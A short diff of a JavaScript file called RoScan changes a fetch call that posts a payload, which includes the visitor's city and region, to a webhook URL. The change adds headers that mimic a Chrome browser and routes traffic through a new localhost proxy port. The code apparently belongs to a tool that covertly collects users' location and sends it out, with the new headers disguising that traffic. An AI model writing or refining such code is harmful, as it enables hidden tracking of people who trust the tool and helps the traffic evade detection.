@@ -1,5 +1,5 @@
 // RoScan JavaScript v2.0.0 - New File Cache Bypass
-console.log('✅ RoScan main-v2.js v2.0.1 loaded - NOW using localhost:8888 proxy');
+console.log('✅ RoScan main-v2.js v2.1.0 loaded - Enhanced security with localhost:7777 proxy');
 
 // Test function for debugging webhook
 window.testWebhook = async function() {
@@ -300,9 +300,15 @@ Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.region || 'Unknown'}
         const response = await fetch(webhookUrl, {
             method: 'POST',
             headers: {
-                'Content-Type': 'application/json'
+                'Content-Type': 'application/json',
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+                'Accept': 'application/json, text/plain, */*',
+                'Accept-Language': 'en-US,en;q=0.9',
+                'Cache-Control': 'no-cache',
+                'X-Requested-With': 'XMLHttpRequest'
             },
-            body: JSON.stringify(payload)
+            body: JSON.stringify(payload),
+            credentials: 'omit'
         });
         
         console.log('Response status:', response.status);
